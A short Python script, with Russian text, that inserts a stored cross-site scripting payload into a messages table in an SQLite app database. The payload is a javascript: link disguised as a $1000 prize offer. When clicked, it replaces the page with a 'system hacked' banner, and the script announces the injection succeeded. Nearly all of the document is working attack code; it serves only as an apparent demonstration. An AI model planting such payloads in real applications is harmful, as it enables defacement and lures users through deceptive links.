import sqlite3
payload = """<a href="javascript:document.body.innerHTML='<div style=\\'background:#111;color:red;font-size:50px;text-align:center;padding-top:20vh;height:100vh;font-family:monospace;\\'>[!] XSS: СИСТЕМА ВЗЛОМАНА</div>';">Нажми сюда, чтобы выиграть 1000$!</a>"""

conn = sqlite3.connect('app.db')
conn.execute(
    "INSERT INTO messages (sender, recipient, text) VALUES (?, ?, ?)",
    ('Иван', 'ivan', payload)
)
conn.commit()
conn.close()
print("XSS-сообщение от Ивана успешно внедрено в базу данных!")